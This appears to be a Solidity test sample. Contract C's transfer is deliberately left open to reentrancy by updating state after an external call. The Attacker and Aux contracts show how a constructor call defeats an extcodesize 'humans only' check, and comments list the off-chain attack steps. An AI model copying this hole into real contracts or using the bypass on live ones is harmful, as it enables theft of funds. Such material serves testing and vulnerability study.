pragma solidity ^0.8.0;

// SPDX-License-Identifier: GPL-3.0
contract C {
    mapping (address => uint256) private balances;

    address private from;

    modifier isHuman() {
        address _addr = msg.sender;
        uint256 _codeLength;
        assembly {_codeLength := extcodesize(_addr)}
        require(_codeLength == 0, "sorry humans only");
        _;
    }

    function setFrom() isHuman() public {
        from = msg.sender;
    }

    function transfer(address to) isHuman() public {
        uint256 amt = balances[from];
        require(amt > 0, "Insufficient funds");
        (bool success, ) = to.call{value:amt}("");
        require(success, "Call failed");
        balances[from] = 0;    // side effect after call
    }

    function deposit() public payable isHuman() {
        balances[from] += msg.value;
    }
}

// an attacker performs from off-chain:
//    deposit{value: 100}();
//    setFrom();
//    transfer(attacker);   // where SELF is the EOA of the attacker and attacker is an instance of the Attacker contract
contract Attacker {

    bool private reentered = false;
    address c;
  
    receive() payable external {
        new Aux(address(this), c);
    }
}

contract Aux {
    constructor(address attacker, address c) {
        C(c).transfer(attacker);        
    }
}
